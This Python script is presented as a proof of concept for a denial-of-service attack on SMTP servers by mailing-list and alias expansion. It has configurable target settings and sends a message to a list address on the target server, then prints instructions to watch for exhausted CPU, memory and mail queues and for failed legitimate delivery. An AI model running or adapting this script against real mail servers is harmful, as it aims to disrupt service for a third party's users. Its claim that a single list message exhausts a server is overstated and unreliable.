#!/usr/bin/env python3
"""
Proof-of-Concept: Mailing List Explosion / Alias Expansion DoS

This script demonstrates how sending a single message to a mailing list or alias
can cause the SMTP server to expand it into thousands of individual delivery attempts,
potentially exhausting CPU, memory, and queue resources.

Based on RFC 5321 Section 3.9 (Mailing Lists and Aliases) and Section 4.5.4.1 (Sending Strategy).
"""

import smtplib
import sys
import time
import socket
from email.mime.text import MIMEText

# Configuration - Modify these for your target
TARGET_SMTP_SERVER = "smtp.target.com"
SMTP_PORT = 25
MAIL_FROM = "attacker@example.com"
MAIL_TO_LIST = "large-list@target.com"  # The mailing list/alias address
SUBJECT = "PoC: List Expansion Test"
BODY = "This is a test message to demonstrate list expansion behavior."

def craft_message():
    """Craft a minimal SMTP message."""
    msg = MIMEText(BODY)
    msg['Subject'] = SUBJECT
    msg['From'] = MAIL_FROM
    msg['To'] = MAIL_TO_LIST
    return msg.as_string()

def send_explosion_message():
    """Send the message to the mailing list address."""
    try:
        # Connect to the SMTP server
        print(f"[*] Connecting to {TARGET_SMTP_SERVER}:{SMTP_PORT}...")
        server = smtplib.SMTP(TARGET_SMTP_SERVER, SMTP_PORT, timeout=10)
        server.ehlo()
        
        # Craft the message
        message = craft_message()
        
        # Send the message to the list address
        print(f"[*] Sending message to list address: {MAIL_TO_LIST}")
        start_time = time.time()
        server.sendmail(MAIL_FROM, [MAIL_TO_LIST], message)
        end_time = time.time()
        
        print(f"[+] Message accepted by server in {end_time - start_time:.2f} seconds.")
        print("[!] If the server is vulnerable, it will now expand the list.")
        print("[!] Monitor server CPU, memory, and mail queue for resource exhaustion.")
        
        server.quit()
        return True
    except smtplib.SMTPException as e:
        print(f"[!] SMTP Error: {e}")
        return False
    except socket.timeout:
        print("[!] Connection timed out. Server may be overloaded.")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False

def main():
    print("=== Mailing List Explosion DoS PoC ===")
    print(f"Target: {TARGET_SMTP_SERVER}")
    print(f"List Address: {MAIL_TO_LIST}")
    print("="*40)
    
    success = send_explosion_message()
    
    if success:
        print("\n[+] PoC execution complete.")
        print("[!] Observe the target server for signs of DoS:")
        print("    - High CPU/Memory usage")
        print("    - Mail queue filling up")
        print("    - Delayed or failed legitimate mail delivery")
    else:
        print("\n[-] PoC failed to send message.")

if __name__ == "__main__":
    main()